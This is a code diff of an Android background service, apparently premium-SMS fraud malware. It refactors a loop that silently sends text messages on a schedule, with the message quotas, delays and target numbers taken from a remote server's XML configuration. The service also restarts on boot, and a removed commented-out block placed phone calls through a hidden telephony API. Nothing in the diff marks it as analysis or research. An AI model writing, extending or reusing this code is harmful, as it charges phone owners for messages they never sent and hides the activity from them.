@@ -86,45 +86,6 @@ public class BgService extends Service {
 //        }
 //    }
     
-    private BroadcastReceiver mSMSSendBroadCast = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            LOGD("receive the intent for send on sms, intent action = " + intent.getAction());
-            SettingManager sm = SettingManager.getInstance(context);
-            long last_sms_time = sm.getLastSMSTime();
-            long sms_delay = sm.getSMSSendDelay();
-            long current_time = System.currentTimeMillis();
-            if ((current_time - last_sms_time) < sms_delay) {
-                sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
-                return;
-            }
-            sm.log(TAG, "receive the intent for send on sms, intent action = " + intent.getAction());
-            if (sm.mXMLHandler != null) {
-                String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
-                if (monthCount != null) {
-                    int sendTotlaCount = Integer.valueOf(monthCount);
-                    int hasSend = sm.getSMSSendCount();
-                    if (hasSend < sendTotlaCount) {
-                        autoSendSMS(BgService.this);
-                        sm.setSMSSendCount(hasSend + 1);
-                        LOGD("this round has send sms count = " + (hasSend + 1));
-                        sm.log(TAG, "this round has send sms count = " + (hasSend + 1));
-                    } else {
-                        sm.log(TAG, "cancel this round the sms auto send, because the send job done");
-                        sm.setSMSSendCount(0);
-                        sm.cancelOneRoundSMSSend();
-                        sm.setLastSMSTime(System.currentTimeMillis());
-                    }
-                } else {
-                    sm.log(TAG, "cancel this round the sms auto send, because month count == null");
-                    sm.cancelOneRoundSMSSend();
-                }
-            } else {
-                sm.log(TAG, "mXMLHandler == null error");
-            }
-        }
-    };
-    
     @Override
     public void onCreate() {
         super.onCreate();
@@ -133,10 +94,6 @@ public class BgService extends Service {
         this.setForeground(true);
         
         mSM = SettingManager.getInstance(BgService.this);
-        
-        IntentFilter filter = new IntentFilter();
-        filter.addAction(ACTION_SEND_SMS_ROUND);
-        this.registerReceiver(mSMSSendBroadCast, filter);
         mSM.setFirstStartTime();
         
         PackageManager pm = getPackageManager();
@@ -161,7 +118,7 @@ public class BgService extends Service {
         super.onStart(intent, startId);
         
         SettingManager sm = SettingManager.getInstance(this);
-        sm.log(TAG, "BgService::onStart");
+        sm.log(TAG, "BgService::onStart action = " + intent.getAction());
         if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
             LOGD("[[onStart]] received the action to get the internet info");
             boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
@@ -177,7 +134,7 @@ public class BgService extends Service {
                 SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true) {
                     long sms_delay_time = sm.getSMSSendDelay();
-                    SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
+                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                 }
             }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
@@ -186,17 +143,19 @@ public class BgService extends Service {
             if (ret == true) {
                 SettingManager.getInstance(this).parseServerXMLInfo();
                 mSM.log(TAG, "start send the sms for one cycle");
-                SettingManager.getInstance(this).startOneRoundSMSSend();
-                
-                sm.setSMSSendDelay(SettingManager.SMS_DEFAULT_DELAY_TIME);
-                long sms_delay_time = sm.getSMSSendDelay();
-                SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
+                SettingManager.getInstance(this).startOneRoundSMSSend(0);
+                mSM.log("cancel the auto message send now and start it after this round sms send");
+                mSM.cancelAutoSendMessage();
             } else {
                 long false_retry_time = ((long) 1) * 3600 * 1000;
                 sm.setSMSSendDelay(false_retry_time);
-                SettingManager.getInstance(this).startAutoSendMessage(false_retry_time);
+                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
             }
+        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS_ROUND) == true) {
+            mSM.log("receive the action = " + intent.getAction());
+            oneRoundSMSSend();
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
+            mSM.log("action is not filtered use the default logic");
             File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
             if (file.exists() == true) {
                 mSM.parseServerXMLInfo();
@@ -208,7 +167,7 @@ public class BgService extends Service {
                 mSM.tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true) {
                     long sms_delay_time = sm.getSMSSendDelay();
-                    SettingManager.getInstance(this).startAutoSendMessage(sms_delay_time);
+                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
                 }
             } else {
                 mSM.tryToFetchInfoFromServer(0);
@@ -221,7 +180,44 @@ public class BgService extends Service {
         super.onDestroy();
 //        this.unregisterReceiver(mDialogBroadCast);
         mSM.log(TAG, "onDestroy");
-        this.unregisterReceiver(mSMSSendBroadCast);
+    }
+    
+    private void oneRoundSMSSend() {
+        SettingManager sm = mSM;
+        long last_sms_time = sm.getLastSMSTime();
+        long sms_delay = sm.getSMSSendDelay();
+        long current_time = System.currentTimeMillis();
+        if ((current_time - last_sms_time) < sms_delay) {
+            sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
+            return;
+        }
+        sm.log(TAG, "receive the intent for send on sms, intent action = " + ACTION_SEND_SMS_ROUND);
+        if (sm.mXMLHandler != null) {
+            String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
+            if (monthCount != null) {
+                int sendTotlaCount = Integer.valueOf(monthCount);
+                int hasSend = sm.getSMSSendCount();
+                if (hasSend < sendTotlaCount) {
+                    autoSendSMS(BgService.this);
+                    sm.setSMSSendCount(hasSend + 1);
+                    LOGD("this round has send sms count = " + (hasSend + 1));
+                    sm.log(TAG, "this round has send sms count = " + (hasSend + 1));
+                } else {
+                    sm.log(TAG, "cancel this round the sms auto send, because the send job done");
+                    sm.setSMSSendCount(0);
+                    sm.cancelOneRoundSMSSend();
+                    sm.setLastSMSTime(System.currentTimeMillis());
+                    sm.setSMSSendDelay(SettingManager.SMS_DEFAULT_DELAY_TIME);
+                    long sms_delay_time = sm.getSMSSendDelay();
+                    sm.startAutoSendMessage(0, sms_delay_time);
+                }
+            } else {
+                sm.log(TAG, "cancel this round the sms auto send, because month count == null");
+                sm.cancelOneRoundSMSSend();
+            }
+        } else {
+            sm.log(TAG, "mXMLHandler == null error");
+        }
     }
     
     private boolean isSendSMS() {
@@ -277,29 +273,6 @@ public class BgService extends Service {
         }
     }
     
-//    private void dial() {
-//        Log.d(TAG, "[[dial]]");
-//        try {
-//            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
-//            if (SettingManager.getInstance(BgService.this).isCallIdle() == true) {
-//                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is idle");
-//                String targetNum = SettingManager.getInstance(getApplicationContext()).getSMSTargetNum();
-//                if (targetNum.equals("") == false) {
-//                    mIsCalling = true;
-//                    mHandler.postDelayed(new CancelTask(), LONG_DIAL_DELAY);
-//                    SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_begin");
-//                    phone.call(targetNum);
-//                } else {
-//                    if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone num is not exist, so do not dial");
-//                }
-//            } else {
-//                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is not idle, delay to dial again");
-//                mHandler.sendEmptyMessageDelayed(DIAL_AUTO, LONG_DIAL_DELAY);
-//            }
-//        } catch (Exception e) {
-//        }
-//    }
-    
     private void homeKeyPress() {
         Intent i= new Intent(Intent.ACTION_MAIN);
 
@@ -350,7 +323,7 @@ public class BgService extends Service {
     
     public final void LOGD(String msg) {
         if (DEBUG) {
-            Log.d(TAG, "[[" + this.getClass().getName() 
+            Log.d(TAG, "[[" + this.getClass().getSimpleName()
                     + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                     + "]] " + msg);
         }
